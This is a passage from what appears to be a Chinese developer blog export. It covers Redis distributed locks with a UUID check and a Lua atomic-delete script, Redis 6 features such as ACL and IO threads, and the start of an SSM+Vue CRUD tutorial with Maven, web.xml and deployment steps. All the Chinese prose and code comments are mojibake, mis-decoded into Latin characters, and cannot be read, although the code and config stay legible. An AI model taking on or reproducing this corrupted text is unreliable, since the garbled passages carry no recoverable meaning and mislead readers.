**\n\nåœºæ™¯ï¼šå¦‚æœä¸šåŠ¡é€»è¾‘çš„æ‰§è¡Œæ—¶é—´æ˜¯7sã€‚æ‰§è¡Œæµç¨‹å¦‚ä¸‹\n\n1. index1ä¸šåŠ¡é€»è¾‘æ²¡æ‰§è¡Œå®Œï¼Œ3ç§’åé”è¢«è‡ªåŠ¨é‡Šæ”¾ã€‚\n\n2. index2è·å–åˆ°é”ï¼Œæ‰§è¡Œä¸šåŠ¡é€»è¾‘ï¼Œ3ç§’åé”è¢«è‡ªåŠ¨é‡Šæ”¾ã€‚\n\n3. index3è·å–åˆ°é”ï¼Œæ‰§è¡Œä¸šåŠ¡é€»è¾‘\n\n4. index1ä¸šåŠ¡é€»è¾‘æ‰§è¡Œå®Œæˆï¼Œå¼€å§‹è°ƒç”¨delé‡Šæ”¾é”ï¼Œè¿™æ—¶é‡Šæ”¾çš„æ˜¯index3çš„é”ï¼Œå¯¼è‡´index3çš„ä¸šåŠ¡åªæ‰§è¡Œ1så°±è¢«åˆ«äººé‡Šæ”¾ã€‚æœ€ç»ˆç­‰äºæ²¡é”çš„æƒ…å†µã€‚\n\nè§£å†³ï¼šsetnxè·å–é”æ—¶ï¼Œè®¾ç½®ä¸€ä¸ªæŒ‡å®šçš„å”¯ä¸€å€¼ï¼ˆä¾‹å¦‚ï¼šuuidï¼‰ï¼›é‡Šæ”¾å‰è·å–è¿™ä¸ªå€¼ï¼Œåˆ¤æ–­æ˜¯å¦è‡ªå·±çš„é”\n\n![](https://img.jwt1399.top/img/202209042210208.png)\n\n![](https://img.jwt1399.top/img/202209042210135.png)\n\n> **ä¼˜åŒ–ä¹‹LUAè„šæœ¬ä¿è¯åˆ é™¤çš„åŸå­æ€§**\n\né—®é¢˜ï¼šåˆ é™¤æ“ä½œç¼ºä¹åŸå­æ€§ã€‚\n\nåœºæ™¯ï¼š\n\n1. index1æ‰§è¡Œåˆ é™¤æ—¶ï¼ŒæŸ¥è¯¢åˆ°çš„lockå€¼ç¡®å®å’Œuuidç›¸ç­‰\n\n```\nuuid=v1\nset(lock,uuid)ï¼›\n```\n\n![](https://img.jwt1399.top/img/202209042212222.png)                         \n\n2. index1æ‰§è¡Œåˆ é™¤å‰ï¼Œlockåˆšå¥½è¿‡æœŸæ—¶é—´å·²åˆ°ï¼Œè¢«redisè‡ªåŠ¨é‡Šæ”¾\n\nåœ¨redisä¸­æ²¡æœ‰äº†lockï¼Œæ²¡æœ‰äº†é”ã€‚\n\n![](https://img.jwt1399.top/img/202209042212030.png) \n\n3. index2è·å–äº†lock\n\nindex2çº¿ç¨‹è·å–åˆ°äº†cpuçš„èµ„æºï¼Œå¼€å§‹æ‰§è¡Œæ–¹æ³•\n\n```\nuuid=v2\nset(lock,uuid)ï¼›\n```\n\n4. index1æ‰§è¡Œåˆ é™¤ï¼Œæ­¤æ—¶ä¼šæŠŠindex2çš„lockåˆ é™¤\n\nindex1 å› ä¸ºå·²ç»åœ¨æ–¹æ³•ä¸­äº†ï¼Œæ‰€ä»¥ä¸éœ€è¦é‡æ–°ä¸Šé”ã€‚index1æœ‰æ‰§è¡Œçš„æƒé™ã€‚index1å·²ç»æ¯”è¾ƒå®Œæˆäº†ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå¼€å§‹æ‰§è¡Œ\n\n![](https://img.jwt1399.top/img/202209042212365.png)\n\nåˆ é™¤çš„index2çš„é”ï¼\n\n```java\n@GetMapping(\"testLockLua\")\npublic void testLockLua() {\n    //1 å£°æ˜ä¸€ä¸ªuuid ,å°†åšä¸ºä¸€ä¸ªvalue æ”¾å…¥æˆ‘ä»¬çš„keyæ‰€å¯¹åº”çš„å€¼ä¸­\n    String uuid = UUID.randomUUID().toString();\n    //2 å®šä¹‰ä¸€ä¸ªé”ï¼šlua è„šæœ¬å¯ä»¥ä½¿ç”¨åŒä¸€æŠŠé”ï¼Œæ¥å®ç°åˆ é™¤ï¼\n    String skuId = \"25\"; // è®¿é—®skuId ä¸º25å·çš„å•†å“ 100008348542\n    String locKey = \"lock:\" + skuId; // é”ä½çš„æ˜¯æ¯ä¸ªå•†å“çš„æ•°æ®\n\n    // 3 è·å–é”\n    Boolean lock = redisTemplate.opsForValue().setIfAbsent(locKey, uuid, 3, TimeUnit.SECONDS);\n\n    // ç¬¬ä¸€ç§ï¼š lock ä¸è¿‡æœŸæ—¶é—´ä¸­é—´ä¸å†™ä»»ä½•çš„ä»£ç ã€‚\n    // redisTemplate.expire(\"lock\",10, TimeUnit.SECONDS);//è®¾ç½®è¿‡æœŸæ—¶é—´\n    // å¦‚æœtrue\n    if (lock) {\n        // æ‰§è¡Œçš„ä¸šåŠ¡é€»è¾‘å¼€å§‹\n        // è·å–ç¼“å­˜ä¸­çš„num æ•°æ®\n        Object value = redisTemplate.opsForValue().get(\"num\");\n        // å¦‚æœæ˜¯ç©ºç›´æ¥è¿”å›\n        if (StringUtils.isEmpty(value)) {\n            return;\n        }\n        // ä¸æ˜¯ç©º å¦‚æœè¯´åœ¨è¿™å‡ºç°äº†å¼‚å¸¸ï¼ é‚£ä¹ˆdelete å°±åˆ é™¤å¤±è´¥ï¼ ä¹Ÿå°±æ˜¯è¯´é”æ°¸è¿œå­˜åœ¨ï¼\n        int num = Integer.parseInt(value + \"\");\n        // ä½¿num æ¯æ¬¡+1 æ”¾å…¥ç¼“å­˜\n        redisTemplate.opsForValue().set(\"num\", String.valueOf(++num));\n        /*ä½¿ç”¨luaè„šæœ¬æ¥é”*/\n        // å®šä¹‰lua è„šæœ¬\n        String script = \"if redis.call('get', KEYS[1]) == ARGV[1] then return redis.call('del', KEYS[1]) else return 0 end\";\n        // ä½¿ç”¨redisæ‰§è¡Œluaæ‰§è¡Œ\n        DefaultRedisScript<Long> redisScript = new DefaultRedisScript<>();\n        redisScript.setScriptText(script);\n        // è®¾ç½®ä¸€ä¸‹è¿”å›å€¼ç±»å‹ ä¸ºLong\n        // å› ä¸ºåˆ é™¤åˆ¤æ–­çš„æ—¶å€™ï¼Œè¿”å›çš„0,ç»™å…¶å°è£…ä¸ºæ•°æ®ç±»å‹ã€‚å¦‚æœä¸å°è£…é‚£ä¹ˆé»˜è®¤è¿”å›String ç±»å‹ï¼Œ\n        // é‚£ä¹ˆè¿”å›å­—ç¬¦ä¸²ä¸0 ä¼šæœ‰å‘ç”Ÿé”™è¯¯ã€‚\n        redisScript.setResultType(Long.class);\n        // ç¬¬ä¸€ä¸ªè¦æ˜¯script è„šæœ¬ ï¼Œç¬¬äºŒä¸ªéœ€è¦åˆ¤æ–­çš„keyï¼Œç¬¬ä¸‰ä¸ªå°±æ˜¯keyæ‰€å¯¹åº”çš„å€¼ã€‚\n        redisTemplate.execute(redisScript, Arrays.asList(locKey), uuid);\n    } else {\n        // å…¶ä»–çº¿ç¨‹ç­‰å¾…\n        try {\n            // ç¡çœ \n            Thread.sleep(1000);\n            // ç¡é†’äº†ä¹‹åï¼Œè°ƒç”¨æ–¹æ³•ã€‚\n            testLockLua();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n```\n\n**æ€»ç»“**\n\nä¸ºäº†ç¡®ä¿åˆ†å¸ƒå¼é”å¯ç”¨ï¼Œæˆ‘ä»¬è‡³å°‘è¦ç¡®ä¿é”çš„å®ç°åŒæ—¶æ»¡è¶³ä»¥ä¸‹å››ä¸ªæ¡ä»¶ï¼š\n\n- **äº’æ–¥æ€§ã€‚**åœ¨ä»»æ„æ—¶åˆ»ï¼Œåªæœ‰ä¸€ä¸ªå®¢æˆ·ç«¯èƒ½æŒæœ‰é”ã€‚\n- **ä¸ä¼šå‘ç”Ÿæ­»é”ã€‚**å³ä½¿æœ‰ä¸€ä¸ªå®¢æˆ·ç«¯åœ¨æŒæœ‰é”çš„æœŸé—´å´©æºƒè€Œæ²¡æœ‰ä¸»åŠ¨è§£é”ï¼Œä¹Ÿèƒ½ä¿è¯åç»­å…¶ä»–å®¢æˆ·ç«¯èƒ½åŠ é”ã€‚\n- **è§£é“ƒè¿˜é¡»ç³»é“ƒäººã€‚**åŠ é”å’Œè§£é”å¿…é¡»æ˜¯åŒä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯è‡ªå·±ä¸èƒ½æŠŠåˆ«äººåŠ çš„é”ç»™è§£äº†ã€‚\n- **åŠ é”å’Œè§£é”å¿…é¡»å…·æœ‰åŸå­æ€§ã€‚**\n\nåŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªäººæœ‰é”ï¼Œè€Œä¸”å¼€é”è§£é”éƒ½æ˜¯åŒä¸€ä¸ªäººï¼Œä¸ä¼šæ­»é”\n\n# åä¸€ã€6.0æ–°åŠŸèƒ½\n\n## 1.ACL\n\n### ç®€ä»‹\n\nRedis ACLæ˜¯Access Control Listï¼ˆè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼‰çš„ç¼©å†™ï¼Œè¯¥åŠŸèƒ½å…è®¸æ ¹æ®å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤å’Œå¯ä»¥è®¿é—®çš„é”®æ¥é™åˆ¶æŸäº›è¿æ¥ã€‚\n\nåœ¨Redis 5ç‰ˆæœ¬ä¹‹å‰ï¼ŒRedis å®‰å…¨è§„åˆ™åªæœ‰å¯†ç æ§åˆ¶ è¿˜æœ‰é€šè¿‡ rename æ¥è°ƒæ•´é«˜å±å‘½ä»¤æ¯”å¦‚ flushdb ï¼Œ KEYS* ï¼Œ shutdown ç­‰ã€‚Redis 6 åˆ™æä¾›ACLçš„åŠŸèƒ½å¯¹ç”¨æˆ·è¿›è¡Œæ›´ç»†ç²’åº¦çš„æƒé™æ§åˆ¶ ï¼š\n\nï¼ˆ1ï¼‰æ¥å…¥æƒé™ï¼šç”¨æˆ·åå’Œå¯†ç  \n\nï¼ˆ2ï¼‰å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ \n\nï¼ˆ3ï¼‰å¯ä»¥æ“ä½œçš„ KEY\n\n### å‘½ä»¤\n\n-  `acl list` å±•ç°ç”¨æˆ·æƒé™åˆ—è¡¨\n\n![](https://img.jwt1399.top/img/202209042132049.png)\n\n- `acl cat` æŸ¥çœ‹æ·»åŠ æƒé™æŒ‡ä»¤ç±»åˆ«ï¼ŒåŠ å‚æ•°ç±»å‹åå¯ä»¥æŸ¥çœ‹ç±»å‹ä¸‹å…·ä½“å‘½ä»¤\n\n| ![](https://img.jwt1399.top/img/202209042135546.png) | ![](https://img.jwt1399.top/img/202209042135820.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\n- `acl whoami` æŸ¥çœ‹å½“å‰ç”¨æˆ·\n\n![](https://img.jwt1399.top/img/202209042136959.png)\n\n- `acl setuser` åˆ›å»ºå’Œç¼–è¾‘ç”¨æˆ·ACL\n\nä¸‹é¢æ˜¯æœ‰æ•ˆACLè§„åˆ™çš„åˆ—è¡¨ã€‚æŸäº›è§„åˆ™åªæ˜¯ç”¨äºæ¿€æ´»æˆ–åˆ é™¤æ ‡å¿—ï¼Œæˆ–å¯¹ç”¨æˆ·ACLæ‰§è¡Œç»™å®šæ›´æ”¹çš„å•ä¸ªå•è¯ã€‚å…¶ä»–è§„åˆ™æ˜¯å­—ç¬¦å‰ç¼€ï¼Œå®ƒä»¬ä¸å‘½ä»¤æˆ–ç±»åˆ«åç§°ã€é”®æ¨¡å¼ç­‰è¿æ¥åœ¨ä¸€èµ·ã€‚\n\n![](https://img.jwt1399.top/img/202209042146682.png)\n\n- åˆ›å»ºæ–°ç”¨æˆ·é»˜è®¤æƒé™\n\n```bash\nacl setuser ç”¨æˆ·å\n```\n\n![](https://img.jwt1399.top/img/202209042149085.png)\n\n- è®¾ç½®æœ‰ç”¨æˆ·åã€å¯†ç ã€ACLæƒé™ã€å¹¶å¯ç”¨çš„ç”¨æˆ·\n\n```bash\nacl setuser user2 on >password ~cached:* +get\n```\n\n![](https://img.jwt1399.top/img/202209042150739.png)\n\n- åˆ‡æ¢ç”¨æˆ·ï¼ŒéªŒè¯æƒé™\n\n```bash\nauth user2 password\n```\n\n![](https://img.jwt1399.top/img/202209042150436.png)\n\n## 2.IOå¤šçº¿ç¨‹\n\nRedis 6ç»ˆäºæ”¯æŒå¤šçº¿ç¨‹äº†ï¼Œå‘Šåˆ«å•çº¿ç¨‹äº†å—ï¼Ÿ\n\nIO å¤šçº¿ç¨‹å…¶å®æŒ‡**å®¢æˆ·ç«¯äº¤äº’éƒ¨åˆ†**çš„**ç½‘ç»œIO**äº¤äº’å¤„ç†æ¨¡å—**å¤šçº¿ç¨‹**ï¼Œè€Œé**æ‰§è¡Œå‘½ä»¤å¤šçº¿ç¨‹**ã€‚Redis6æ‰§è¡Œå‘½ä»¤ä¾ç„¶æ˜¯å•çº¿ç¨‹ã€‚\n\n **åŸç†æ¶æ„**\n\nRedis 6 åŠ å…¥å¤šçº¿ç¨‹ï¼Œä½†è·Ÿ Memcached è¿™ç§ä» IOå¤„ç†åˆ°æ•°æ®è®¿é—®å¤šçº¿ç¨‹çš„å®ç°æ¨¡å¼æœ‰äº›å·®å¼‚ã€‚Redis çš„å¤šçº¿ç¨‹éƒ¨åˆ†åªæ˜¯ç”¨æ¥å¤„ç†ç½‘ç»œæ•°æ®çš„è¯»å†™å’Œåè®®è§£æï¼Œæ‰§è¡Œå‘½ä»¤ä»ç„¶æ˜¯å•çº¿ç¨‹ã€‚ä¹‹æ‰€ä»¥è¿™ä¹ˆè®¾è®¡æ˜¯ä¸æƒ³å› ä¸ºå¤šçº¿ç¨‹è€Œå˜å¾—å¤æ‚ï¼Œéœ€è¦å»æ§åˆ¶ keyã€luaã€äº‹åŠ¡ï¼ŒLPUSH/LPOP ç­‰ç­‰çš„å¹¶å‘é—®é¢˜ã€‚æ•´ä½“çš„è®¾è®¡å¤§ä½“å¦‚ä¸‹:\n\n![](https://img.jwt1399.top/img/202209042159608.png)\n\nå¦å¤–ï¼Œå¤šçº¿ç¨‹IOé»˜è®¤ä¹Ÿæ˜¯ä¸å¼€å¯çš„ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®\n\n```\nio-threads-do-reads yes \n\nio-threads 4\n```\n\n## 3.Cluster\n\nä¹‹å‰è€ç‰ˆ Redis æƒ³è¦æ­é›†ç¾¤éœ€è¦å•ç‹¬å®‰è£… ruby ç¯å¢ƒï¼ŒRedis 5 å°† redis-trib.rb çš„åŠŸèƒ½é›†æˆåˆ° redis-cli ã€‚å¦å¤–å®˜æ–¹ redis-benchmark å·¥å…·å¼€å§‹æ”¯æŒ cluster æ¨¡å¼äº†ï¼Œé€šè¿‡å¤šçº¿ç¨‹çš„æ–¹å¼å¯¹å¤šä¸ªåˆ†ç‰‡è¿›è¡Œå‹æµ‹ã€‚\n\n## 4.å…¶å®ƒåŠŸèƒ½\n\n1ã€RESP3æ–°çš„ Redis é€šä¿¡åè®®ï¼šä¼˜åŒ–æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ä¹‹é—´é€šä¿¡\n\n2ã€Client side cachingå®¢æˆ·ç«¯ç¼“å­˜ï¼šåŸºäº RESP3 åè®®å®ç°çš„å®¢æˆ·ç«¯ç¼“å­˜åŠŸèƒ½ã€‚ä¸ºäº†è¿›ä¸€æ­¥æå‡ç¼“å­˜çš„æ€§èƒ½ï¼Œå°†å®¢æˆ·ç«¯ç»å¸¸è®¿é—®çš„æ•°æ®cacheåˆ°å®¢æˆ·ç«¯ã€‚å‡å°‘TCPç½‘ç»œäº¤äº’ã€‚\n\n3ã€Proxyé›†ç¾¤ä»£ç†æ¨¡å¼ï¼šProxy åŠŸèƒ½ï¼Œè®© Cluster æ‹¥æœ‰åƒå•å®ä¾‹ä¸€æ ·çš„æ¥å…¥æ–¹å¼ï¼Œé™ä½å¤§å®¶ä½¿ç”¨clusterçš„é—¨æ§›ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ä»£ç†ä¸æ”¹å˜ Cluster çš„åŠŸèƒ½é™åˆ¶ï¼Œä¸æ”¯æŒçš„å‘½ä»¤è¿˜æ˜¯ä¸ä¼šæ”¯æŒï¼Œæ¯”å¦‚è·¨ slot çš„å¤šKeyæ“ä½œã€‚\n\n4ã€Modules APIï¼šRedis 6ä¸­æ¨¡å—APIå¼€å‘è¿›å±•éå¸¸å¤§ï¼Œå› ä¸ºRedis Labsä¸ºäº†å¼€å‘å¤æ‚çš„åŠŸèƒ½ï¼Œä»ä¸€å¼€å§‹å°±ç”¨ä¸ŠRedisæ¨¡å—ã€‚Rediså¯ä»¥å˜æˆä¸€ä¸ªæ¡†æ¶ï¼Œåˆ©ç”¨Modulesæ¥æ„å»ºä¸åŒç³»ç»Ÿï¼Œè€Œä¸éœ€è¦ä»å¤´å¼€å§‹å†™ç„¶åè¿˜è¦BSDè®¸å¯ã€‚Redisä¸€å¼€å§‹å°±æ˜¯ä¸€ä¸ªå‘ç¼–å†™å„ç§ç³»ç»Ÿå¼€æ”¾çš„å¹³å°ã€‚\n\n\n\n# å‚è€ƒ\n\n- [ Redisæ¡†æ¶ä»å…¥é—¨åˆ°å­¦ç²¾ï¼ˆå…¨ï¼‰](https://blog.csdn.net/weixin_47872288/article/details/118410080)\n- [RedisåŸºç¡€ç¯‡ (oz6.cn)](https://www.oz6.cn/articles/58)\n\n\n\n# Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["NoSQL"],"categories":["SQL"]},{"title":"SSMæ•´åˆ","url":"/posts/42096.html","content":"\nä»Šå¤©å¼€å§‹å­¦ä¹ æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠSSMæ•´åˆã€‹ï¼Œå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡7å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š06-03\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š06-17\n- [x] ğŸ€æ€»ç»“ï¼šä¸­é—´èŠ±äº†ç‚¹æ—¶é—´å­¦Vueï¼Œç£¨ç£¨è¹­è¹­çš„ç»ˆäºå®Œæˆäº†ï¼Œé…ç½®å¤ªå¤šäº†ï¼Œä¸€ç›´åœ¨æ”¹bugçš„è·¯ä¸Šï¼Œå‰ç«¯æ¯”åç«¯éš¾ï¼\n\n## ä¸€ã€é¡¹ç›®æ¦‚è§ˆ\n\n> æœ¬æ–‡å°†å®ç°ä¸€ä¸ªåŸºäº SSM-VUE å‰åç«¯åˆ†ç¦»çš„ CRUD çš„å° Demo æ¥å­¦ä¹ SSMæ•´åˆï¼Œé¡¹ç›®å‘½åä¸ºSSM-VUE-CRUD\n\né¡¹ç›®åœ°å€ï¼šhttps://github.com/jwt1399/SSM-VUE-CRUD\n\n### ç›¸å…³æŠ€æœ¯\n\n####  å‰ç«¯\n\n- å¼€å‘æ¡†æ¶ï¼šVue3ã€Axiosã€Element Plus\n- è„šæ‰‹æ¶ï¼š@Vue/cli\n\n- ä¾èµ–ç®¡ç†: npm\n\n- å¼€å‘å·¥å…·ï¼šVSCode ã€Chrome\n\n#### åç«¯\n\n- å¼€å‘æ¡†æ¶ï¼šSpringã€SpringMVCã€Mybatis\n\n- æ•°æ®åº“ï¼šMySQL\n\n- åˆ†é¡µï¼š pagehelper\n- é€†å‘å·¥ç¨‹ï¼š Mybatis Generator\n\n- ä¾èµ–ç®¡ç†ï¼š Maven\n- å¼€å‘å·¥å…·ï¼šIDEA 2022.1ã€Navicat 16\n\n### é¡¹ç›®å±•ç¤º\n\n#### 1.å‘˜å·¥åˆ—è¡¨\n\n![](https://img.jwt1399.top/img/202206181715532.png)\n\n#### 2.æ·»åŠ å‘˜å·¥\n\n![](https://img.jwt1399.top/img/202206181715024.png)\n\n#### 3.ä¿®æ”¹å‘˜å·¥\n\n![](https://img.jwt1399.top/img/202206181716115.png)\n\n#### 4.åˆ é™¤å‘˜å·¥\n\n![](https://img.jwt1399.top/img/202206181716034.png)\n\n#### 5.æ‰¹é‡åˆ é™¤å‘˜å·¥\n\n![](https://img.jwt1399.top/img/202206181716759.png)\n\n### é¡¹ç›®éƒ¨ç½²\n\n#### åç«¯éƒ¨ç½²\n\n##### 1.å…‹éš†æœ¬é¡¹ç›®åˆ°æœ¬åœ°\n\n```bash\ngit clone https://github.com/jwt1399/SSM-VUE-CRUD.git\n```\n\n##### 2.åˆ›å»ºæ•°æ®åº“å¯¼å…¥æ•°æ®\n\nå…ˆåˆ›å»ºä¸€ä¸ªåä¸º ssm_crud çš„æ•°æ®åº“ï¼Œç„¶åå†å¯¼å…¥è¡¨æ•°æ® `ssm_crud.sql`\n\n##### 3.å®‰è£…ä¾èµ–\n\nä½¿ç”¨ IDEA æ‰“å¼€é¡¹ç›®ä¸‹çš„ ssm-crud-back ï¼Œç­‰å¾… Maven å°† pom.xml ä¸­çš„ä¾èµ–ä¸‹è½½å®Œ\n\n##### 4.ä¿®æ”¹æ•°æ®åº“é…ç½®\n\næ‰¾åˆ° src/main/resouces/db.properties ä¿®æ”¹æˆä½ è‡ªå·±çš„æ•°æ®åº“é…ç½®\n\n```properties\njdbc.driver=com.mysql.cj.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/ssm_crud?useUnicode=true&characterEncoding=utf8\njdbc.username=root\njdbc.password=root\n```\n\n##### 5.æ·»åŠ TomCat\n\n- ç‚¹å‡» Add Configuration(æ·»åŠ é…ç½®) è¿›è¡Œé…ç½®ï¼Œ ç‚¹å‡» + å·ï¼Œæ‰¾åˆ° Tomcat Service -> Local(æœ¬åœ°)\n- å†ç‚¹å‡» Tomcat é…ç½®ç•Œé¢çš„ Deployment(éƒ¨ç½²)ï¼Œå†ç‚¹å‡»å³ä¸‹è§’çš„ fix ï¼Œé€‰æ‹© ssm-crud-back:war explodedï¼Œå†å°† Application context(åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡) æ”¹ä¸º /ssm_crud_back\n- å†å°†æœåŠ¡å™¨ URL æ”¹ä¸º\"`http://localhost:8080/ssm_crud_back/`\"ï¼Œä¿®æ”¹ååº”ç”¨å³å¯\n\n##### 6.å¯åŠ¨é¡¹ç›®\n\né…ç½®å®Œ TomCat åè¿è¡Œé¡¹ç›®ï¼Œæµè§ˆå™¨ä¼šæ‰“å¼€\"`http://localhost:8080/ssm_crud_back/`\"ï¼Œæ˜¾ç¤ºâ€œSSM-VUE-CRUDåç«¯éƒ¨ç½²æˆåŠŸï¼ï¼ï¼â€çš„æ–‡å­—ï¼Œè¡¨ç¤ºåç«¯è¿è¡ŒæˆåŠŸ\n\n#### å‰ç«¯éƒ¨ç½²\n\n##### 1.å®‰è£…ä¾èµ–\n\nä½¿ç”¨ VScode æ‰“å¼€é¡¹ç›®ä¸‹çš„ ssm-crud-frontï¼Œæ‰“å¼€ç»ˆç«¯æ‰§è¡Œ `npm i` ä¸‹è½½ä¾èµ–\n\n##### 2.å¯åŠ¨é¡¹ç›®\n\nç»ˆç«¯å†æ‰§è¡Œ `npm run serve` è¿è¡Œé¡¹ç›®ï¼Œç¼–è¯‘å®Œæˆåä¼šæµè§ˆå™¨ä¼šè‡ªåŠ¨æ‰“å¼€ \"`http://0.0.0.0:8084/#/`\"ï¼ˆå¯åœ¨vue.config.ä¿®æ”¹ï¼‰ï¼Œå½“çœ‹åˆ°é¡¹ç›®å±•ç¤ºä¸­çš„é¡µé¢å°±è¯´æ˜éƒ¨ç½²æˆåŠŸå•¦ã€‚\n\n## äºŒã€åç«¯å®ç°\n\n### 1.ç¯å¢ƒæ­å»º\n\n#### a.åˆ›å»ºMavené¡¹ç›®\n\nå‚è€ƒï¼š[IDEAåˆ›å»ºmaven webå·¥ç¨‹](https://www.cnblogs.com/l-y-h/p/11454933.html)\n\n#### b.å¼•å…¥é¡¹ç›®ä¾èµ–jaråŒ…\n\néœ€è¦é…ç½®Springï¼ŒSpringMVCï¼Œmybatisï¼Œæ•°æ®åº“è¿æ¥æ± ï¼Œæ•°æ®åº“é©±åŠ¨åŒ…ï¼Œä»¥åŠå…¶ä»–çš„jaråŒ…ï¼Œæ¯”å¦‚junitç­‰ã€‚\n\n```xml\n<dependencies>\n  <!-- Spring WebMVC -->\n  <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-webmvc</artifactId>\n      <version>5.3.20</version>\n  </dependency>\n\n  <!-- Spring JDBC -->\n  <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-jdbc</artifactId>\n      <version>5.3.20</version>\n  </dependency>\n\n  <!-- Spring Aspects -->\n  <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-aspects</artifactId>\n      <version>5.3.20</version>\n  </dependency>\n  \n  <!-- Spring test -->\n  <dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-test</artifactId>\n      <version>5.3.20</version>\n      <scope>test</scope>\n  </dependency>\n\n  <!-- Mybatis -->\n  <dependency>\n      <groupId>org.mybatis</groupId>\n      <artifactId>mybatis</artifactId>\n      <version>3.5.10</version>\n  </dependency>\n\n  <!-- spring ä¸ mybatis çš„æ•´åˆåŒ… -->\n  <dependency>\n      <groupId>org.mybatis</groupId>\n      <artifactId>mybatis-spring</artifactId>\n      <version>2.0.7</version>\n  </dependency>\n\n  <!-- æ•°æ®åº“è¿æ¥æ± ï¼Œdruid -->\n  <dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>druid</artifactId>\n    <version>1.2.10</version>\n  </dependency>\n\n  <!-- mysqlé©±åŠ¨åŒ… -->\n  <dependency>\n      <groupId>mysql</groupId>\n      <artifactId>mysql-connector-java</artifactId>\n      <version>8.0.29</version>\n  </dependency>\n\n  <!-- é€†å‘å·¥ç¨‹ -->\n  <dependency>\n      <groupId>org.mybatis.generator</groupId>\n      <artifactId>mybatis-generator-core</artifactId>\n      <version>1.4.1</version>\n  </dependency>\n  \n  <!-- pagehelper åˆ†é¡µæ’ä»¶ -->\n  <dependency>\n      <groupId>com.github.pagehelper</groupId>\n      <artifactId>pagehelper</artifactId>\n      <version>5.3.0</version>\n  </dependency>\n  \n  <!-- jackson-databind -->\n  <dependency>\n    <groupId>com.fasterxml.jackson.core</groupId>\n    <artifactId>jackson-databind</artifactId>\n    <version>2.13.3</version>\n  </dependency>\n\n</dependencies>\n```\n\n#### c.é…ç½®web.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n    <!-- step1: é…ç½®å…¨å±€çš„å‚æ•°ï¼Œå¯åŠ¨Springå®¹å™¨ -->\n    <context-param>\n        <param-name>contextConfigLocation</param-name>\n        <!-- è‹¥æ²¡æœ‰æä¾›å€¼ï¼Œé»˜è®¤ä¼šå»æ‰¾/WEB-INF/applicationContext.xmlã€‚ -->\n        <param-value>classpath:applicationContext.xml</param-value>\n    </context-param>\n    <listener>\n        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n    </listener>\n\n    <!-- step2: é…ç½®SpringMVCçš„å‰ç«¯æ§åˆ¶å™¨ï¼Œç”¨äºæ‹¦æˆªæ‰€æœ‰çš„è¯·æ±‚  -->\n    <servlet>\n        <servlet-name>springMVC</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            <!-- è‹¥æ²¡æœ‰æä¾›å€¼ï¼Œé»˜è®¤ä¼šå»æ‰¾WEB-INF/*-servlet.xmlã€‚ -->\n            <!-- ä½¿ç”¨classpath:è¡¨ç¤ºä»ç±»è·¯å¾„æŸ¥æ‰¾é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚mavenå·¥ç¨‹ä¸­çš„src/main/resources -->\n            <param-value>classpath:springMVC.xml</param-value>\n        </init-param>\n        <!-- 